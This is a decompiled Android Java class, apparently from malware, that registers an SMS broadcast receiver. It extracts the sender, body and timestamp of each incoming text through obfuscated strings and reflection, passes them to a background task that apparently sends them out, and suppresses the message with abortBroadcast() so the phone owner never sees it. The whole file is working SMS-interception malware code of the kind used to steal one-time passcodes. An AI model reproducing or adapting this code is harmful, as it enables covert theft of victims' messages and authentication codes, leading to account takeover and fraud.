package com.sonnokta;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.sonnokta.utils.LogUtil;

import fddo.Cbreak;
import fddo.Cgoto;
import fddo.Cthis;

import java.lang.reflect.InvocationTargetException;
import java.text.SimpleDateFormat;

import org.json.JSONException;
import org.json.JSONObject;

public class p050i extends BroadcastReceiver {
    private static String TAG = "bwolf-p050i";

    /* renamed from: fddo  reason: collision with root package name */
    private static final String f101fddo = Cbreak.fddo("00fce6472ffbf1e8");

    public JSONObject fddo(Context context, Intent intent) {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        Object[] objArr;
        String str;
        Bundle extras = intent.getExtras();
        if (extras == null || (objArr = (Object[]) extras.get(Cbreak.fddo("4ea6c059"))) == null) {
            return null;
        }
        int length = objArr.length;
        SmsMessage[] smsMessageArr = new SmsMessage[length];
        for (int i = 0; i < objArr.length; i++) {
            smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
        }
        if (length == 1 || smsMessageArr[0].isReplace()) {
            str = smsMessageArr[0].getDisplayMessageBody();
        } else {
            StringBuilder sb = new StringBuilder();
            for (int i2 = 0; i2 < length; i2++) {
                sb.append(smsMessageArr[i2].getMessageBody());
            }
            str = sb.toString();
        }
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(Cbreak.fddo("5aa69a671186ebe7762aff157f342402f8b574"));
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(Cbreak.fddo("46a1"), Cbreak.fddo("5c91"));
            String str2 = (String) smsMessageArr[0].getClass().getDeclaredMethod(Cbreak.fddo("59a7c16e35dae2f26e2a902f5e692001a3b26e7164aacd1cc77e3a9a"), new Class[0]).invoke(smsMessageArr[0], new Object[0]);
            jSONObject.put(Cbreak.fddo("4d83"), str2);
            jSONObject.put(Cbreak.fddo("4d80"), str);
            String format = simpleDateFormat.format(Long.valueOf(smsMessageArr[0].getTimestampMillis()));
            jSONObject.put(Cbreak.fddo("4d96"), format);
            Cgoto.r(context, format, str2 + Cbreak.fddo("04") + str);
        } catch (JSONException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
        return jSONObject;
    }

    public void onReceive(Context context, Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onReceive ---");
        try {
            JSONObject fddo2 = fddo(context, intent);
            if (fddo2 != null) {
                new Cthis(context, fddo2).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);
            }
        } catch (Exception e) {
            Cgoto.m110class(context, "EXC_SMSRCV", e);
        }
        abortBroadcast();
    }
}
